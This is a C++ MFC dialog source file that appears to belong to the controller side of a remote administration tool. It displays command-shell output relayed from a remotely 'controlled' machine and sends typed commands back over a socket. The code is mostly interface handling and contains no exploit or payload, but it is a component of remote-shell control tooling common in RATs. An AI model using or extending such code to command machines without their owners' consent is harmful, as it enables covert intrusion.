// CMDManagerDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Server.h"
#include "resource.h"
#include "CMDManagerDlg.h"
#include "afxdialogex.h"

#include "Common.h"


// CCMDManagerDlg dialog

IMPLEMENT_DYNAMIC(CCMDManagerDlg, CDialogEx)

CCMDManagerDlg::CCMDManagerDlg(CWnd* pParent, CIOCPServer *IOCPServer, CONTEXT_OBJECT* ContextObject)
	: CDialogEx(IDD_DIALOG_CMD_MANAGER, pParent)
{
	_tprintf_s(_T("CCMDManagerDlg()"));
	_M_IOCPServer = IOCPServer;
	_M_ContextObject = ContextObject;

	_M_IconHwnd = LoadIcon(AfxGetInstanceHandle(),MAKEINTRESOURCE(IDR_MAINFRAME));

	return;
}

CCMDManagerDlg::~CCMDManagerDlg()
{
	
}

void CCMDManagerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT_CMD_MANAGER, _M_CEdit_Cmd);
}


void CCMDManagerDlg::OnRecvComplete(void)
{
	if (_M_ContextObject == NULL)
	{
		return;
	}

	ShowCmdData();

	_M_ShowDataLength = _M_CEdit_Cmd.GetWindowTextLength();

	return;
}

void CCMDManagerDlg::ShowCmdData()
{
	_M_ContextObject->_M_InDeCompressedBufferData.WriteArray((LPBYTE)_T(""), 1);
	// 从被控端发来的数据我们要加上一个 '\0'
	CString v1 = (char*)_M_ContextObject->_M_InDeCompressedBufferData.GetArray(0);
	// 获得所有数据 包括 '\0'
	v1.Replace(_T("\n"), _T("\r\n"));
	// 替换掉原先的换行符
	int BufferLength = _M_CEdit_Cmd.GetWindowTextLength();
	// 定位光标
	_M_CEdit_Cmd.SetSel(BufferLength, BufferLength);
	// 显示
	_M_CEdit_Cmd.ReplaceSel(v1);

	//
	_M_CurrentPos = _M_CEdit_Cmd.GetWindowTextLength();

	return;
}


BEGIN_MESSAGE_MAP(CCMDManagerDlg, CDialogEx)
	ON_WM_CLOSE()
	ON_WM_CTLCOLOR()
END_MESSAGE_MAP()


// CCMDManagerDlg message handlers


BOOL CCMDManagerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	SetIcon(_M_IconHwnd, FALSE);

	CString v1;
	sockaddr_in ClientAddr;
	ZeroMemory(&ClientAddr, sizeof(sockaddr_in));
	int ClientLength = sizeof(ClientAddr);
	BOOL rVal = getpeername(_M_ContextObject->ClientSocket, (sockaddr*)&ClientAddr, &ClientLength);

	v1.Format(_T("\\\\%s - CMD Manager"), rVal != INVALID_SOCKET ? inet_ntoa(ClientAddr.sin_addr) : "");

	SetWindowText(v1);

	BYTE IsToken = CLIENT_GO_ON;

	_M_IOCPServer->OnClientPreSend(_M_ContextObject, &IsToken, sizeof(BYTE));

	return TRUE;   
}

BOOL CCMDManagerDlg::PreTranslateMessage(MSG* pMsg)
{
	if (pMsg->message == WM_KEYDOWN)
	{
		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
		{
			return TRUE;
		}
		if (pMsg->wParam == VK_RETURN && pMsg->hwnd == _M_CEdit_Cmd.m_hWnd)
		{
			int BufferLength = _M_CEdit_Cmd.GetWindowTextLength();
			CString BufferData;
			_M_CEdit_Cmd.GetWindowText(BufferData);
			BufferData += _T("\r\n");

			_M_IOCPServer->OnClientPreSend(
					_M_ContextObject,
					(LPBYTE)BufferData.GetBuffer(0) + _M_CurrentPos,
					BufferData.GetLength() - _M_CurrentPos
				);
			_M_CurrentPos = _M_CEdit_Cmd.GetWindowTextLength();
		}
		if (pMsg->wParam == VK_BACK && pMsg->hwnd == _M_CEdit_Cmd.m_hWnd)
		{
			if (_M_CEdit_Cmd.GetWindowTextLength() <= _M_ShowDataLength)
			{
				return TRUE;
			}
		}
	}

	return CDialogEx::PreTranslateMessage(pMsg);
}

void CCMDManagerDlg::  OnClose()
{
	if (_M_ContextObject != NULL)
	{
		_M_ContextObject->DlgId = 0;
		_M_ContextObject->DlgHandle = NULL;
		CancelIo((HANDLE)_M_ContextObject->ClientSocket);
		closesocket(_M_ContextObject->ClientSocket);
	}

	CDialogEx::OnClose();
}

HBRUSH CCMDManagerDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialogEx::OnCtlColor(pDC, pWnd, nCtlColor);

	if ((pWnd->GetDlgCtrlID() == IDC_EDIT_CMD_MANAGER) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF ColorReference = RGB(255, 255, 255);
		pDC->SetTextColor(ColorReference);
		ColorReference = RGB(0, 0, 0);
		pDC->SetBkColor(ColorReference);

		return CreateSolidBrush(ColorReference);
	}
	else
	{
		return CDialogEx::OnCtlColor(pDC, pWnd, nCtlColor);
	}


	return hbr;
}
